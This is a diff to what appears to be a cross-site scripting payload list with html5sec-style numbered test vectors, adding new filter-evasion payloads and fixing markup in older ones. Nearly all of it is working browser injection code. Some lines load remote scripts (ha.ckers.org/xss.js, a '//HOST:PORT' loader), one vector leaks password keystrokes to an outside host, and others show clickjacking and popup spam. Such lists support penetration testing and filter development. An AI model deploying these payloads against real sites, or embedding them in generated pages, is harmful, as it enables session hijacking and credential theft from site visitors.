@@ -2,6 +2,7 @@
 "><svg onload=alert(1)//
 "onmouseover=alert(1)//
 "autofocus/onfocus=alert(1)//
+'-alert(1)-'
 </script><svg onload=alert(1)>
 <x contenteditable onblur=alert(1)>lose focus! 
 <x onclick=alert(1)>click this! 
@@ -25,9 +26,13 @@
 <script>alert(1)<!–
 <script src=//brutelogic.com.br/1.js> 
 <script src=//3334957647/1>
+%3Cx onxxx=alert(1) 
+<x onxxx=1 onxxx=1
 <x 1='1'onxxx=1 
 <x 1="1"onxxx=1
+<x </onxxx=1 
 <x 1=">" onxxx=1 
+<http://onxxx%3D1/
 <x onxxx=alert(1) 1='
 <svg onload=setInterval(function(){with(document)body.appendChild(createElement('script')).src='//HOST:PORT'},0)>
 'onload=alert(1)><svg/1='
@@ -90,6 +95,8 @@ GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;
 <form onsubmit=alert(1)><input type=submit>
 <select onchange=alert(1)><option>1<option>2
 <menu id=x contextmenu=x onshow=alert(1)>right click me!
+alert&#x28;1&#x29
+alert&#40;1&#41
 a=alert,a(1)
 top["al"+"ert"](1)
 eval(URL.slice(-8))>#alert(1)
@@ -278,6 +285,7 @@ a="get";
 <SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
 <SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT>
 <SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+>>> vectors()
 <div id="28">1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2)  attributename=innerhtml values=&lt;img/src=&quot;.&quot;onerror=alert(28)&gt;>//["'`-->]]>]</div>
 <div id="39"><!-- up to Opera 11.52, FF 3.6.28 -->
 <![><img src="]><img src=x onerror=alert(39)//">
@@ -288,8 +296,11 @@ a="get";
 <div id="42"><head><base href="javascript://"/></head><body><a href="/. /,alert(42)//#">XXX</a></body>//["'`-->]]>]</div>
 <div id="43"><?xml version="1.0" standalone="no"?>
 <html xmlns="http://www.w3.org/1999/xhtml">
+<head>
 <style type="text/css">
 @font-face {font-family: y; src: url("font.svg#x") format("svg");} body {font: 100px "y";}
+</style>
+</head>
 <body>Hello</body>
 </html>//["'`-->]]>]</div>
 <div id="53"><xml id="xss" src="test.htc"></xml>
@@ -333,6 +344,7 @@ a="get";
 </svg>//["'`-->]]>]</div>
 <div id="90"><!-- Up to Opera 10.63 -->
 <div style=content:url(test2.svg)></div>
+<!-- Up to Opera 11.64 - see link below -->
 <div style="background:url(test5.svg)">PRESS ENTER</div>//["'`-->]]>]</div>
 <div id="91">[A]
 <? foo="><script>alert(91)</script>">
@@ -359,6 +371,7 @@ PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ%2BYWxlcnQoMSk8L3
 <div id="98"><div id=d><div style="font-family:'sans\27\2F\2A\22\2A\2F\3B color\3Ared\3B'">X</div></div>
 <script>with(document.getElementById("d"))innerHTML=innerHTML</script>//["'`-->]]>]</div>
 <div id="99">XXX<style>
+--><!--*{color:red}   /* all UA */
 </style>//["'`-->]]>]</div>
 <div id="104"><svg xmlns="http://www.w3.org/2000/svg" id="foo">
 <x xmlns="http://www.w3.org/2001/xml-events" event="load" observer="foo" handler="data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Chandler%20xml%3Aid%3D%22bar%22%20type%3D%22application%2Fecmascript%22%3E alert(104) %3C%2Fhandler%3E%0A%3C%2Fsvg%3E%0A#bar"/>
@@ -377,6 +390,8 @@ PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ%2BYWxlcnQoMSk8L3
 </svg>//["'`-->]]>]</div>
 <div id="111"><div style="background:url(/f#[a]oo/;color:red/*/foo.jpg);">X</div>//["'`-->]]>]</div><div id="112"><div style="font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);">X</div>//["'`-->]]>]</div>
 <div id="113"><div id="x">XXX</div>
+<style>
+#x{font-family:foo[bar;color:green;}
 </style>//["'`-->]]>]</div>
 <div id="114"><x style="background:url('x[a];color:red;/*')">XXX</x>//["'`-->]]>]</div>
 <div id="115"><!--[if]><script>alert(115)</script -->
@@ -390,12 +405,15 @@ PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ%2BYWxlcnQoMSk8L3
 </a>//["'`-->]]>]</div>
 <div id="118"><div draggable="true" ondragstart="event.dataTransfer.setData('text/plain','malicious code');">
     <h1>Drop me</h1>
+</div>
 <iframe src="http://www.example.org/dropHere.html"></iframe>//["'`-->]]>]</div>
 <div id="119"><iframe src="view-source:http://www.example.org/" frameborder="0" style="width:400px;height:180px"></iframe>
 <textarea type="text" cols="50" rows="10"></textarea>//["'`-->]]>]</div>
 <div id="120"><script>
     for (i=1;i<6;i++) {
         window.open('popup.html','spam'+i,'width=50,height=50');
+</script>
+<body>
 <a href="#" onclick="makePopups()">Spam</a>//["'`-->]]>]</div>
 <div id="121"><html xmlns="http://www.w3.org/1999/xhtml"
 xmlns:svg="http://www.w3.org/2000/svg">
@@ -405,15 +423,20 @@ xmlns:svg="http://www.w3.org/2000/svg">
 <svg:mask id="maskForClickjacking" maskUnits="objectBoundingBox" maskContentUnits="objectBoundingBox">
     <svg:rect x="0.0" y="0.0" width="0.373" height="0.3" fill="white"/>
     <svg:circle cx="0.45" cy="0.7" r="0.075" fill="white"/>
+</svg:mask>
 </svg:svg>
+</body>
 </html>//["'`-->]]>]</div>
 <div id="122"><iframe sandbox="allow-same-origin allow-forms allow-scripts" src="http://example.org/"></iframe>//["'`-->]]>]</div>
 <div id="123"><span class=foo>Some text</span>
 <a class=bar href="http://www.example.org">www.example.org</a>
 <script src="http://code.jquery.com/jquery-1.4.4.js"></script>
+<script>
 $("span.foo").click(function() {
+alert('foo');
 $("a.bar").click();
 $("a.bar").click(function() {
+alert('bar');
 location="http://html5sec.org";
 </script>//["'`-->]]>]</div>
 <div id="124"><script src="/\example.com\foo.js"></script> // Safari 5.0, Chrome 9, 10
@@ -439,6 +462,7 @@ location="http://html5sec.org";
 <image filter='...'>
 </svg>//["'`-->]]>]</div>
 <div id="130"><math href="javascript:alert(130)">CLICKME</math>
+<math>
 <maction actiontype="statusline#http://google.com" xlink:href="javascript:alert(2)">CLICKME</maction>
 <maction actiontype="statusline" xlink:href="javascript:alert(3)">CLICKME<mtext>http://http://google.com</mtext></maction>
 </math>//["'`-->]]>]</div>
@@ -454,8 +478,11 @@ feed:feed:javAscript:javAscript:feed:alert('Top Page Location: '+document.locati
 <br/><hr/>
 <div id="dropbox" style="height: 360px;width: 500px;border: 5px solid #000;position: relative;" ondragover="event.preventDefault()">+ Drop Box +</div>//["'`-->]]>]</div>
 <div id="132"><!doctype html>
+<form>
 <label>type a,b,c,d - watch the network tab/traffic (JS is off, latest NoScript)</label>
+<br>
 <input name="secret" type="password">
+</form>
 <!-- injection --><svg height="50px">
 <image xmlns:xlink="http://www.w3.org/1999/xlink">
 <set attributeName="xlink:href" begin="accessKey(a)" to="//example.com/?a" />
@@ -466,8 +493,13 @@ feed:feed:javAscript:javAscript:feed:alert('Top Page Location: '+document.locati
 <div id="133"><!-- `<img/src=xx:xx onerror=alert(133)//--!>//["'`-->]]>]</div>
 <div id="134"><xmp>
 <img alt='%></xmp><img src=xx:x onerror=alert(134)//'>
+<script>
 x='<%'
 </script> %>/
+</script>
+<style>
+*['<!--']{}
+</style>
 *{color:red}</style>//["'`-->]]>]</div>
 <div id="135"><?xml-stylesheet type="text/xsl" href="#" ?>
 <stylesheet xmlns="http://www.w3.org/TR/WD-xsl">
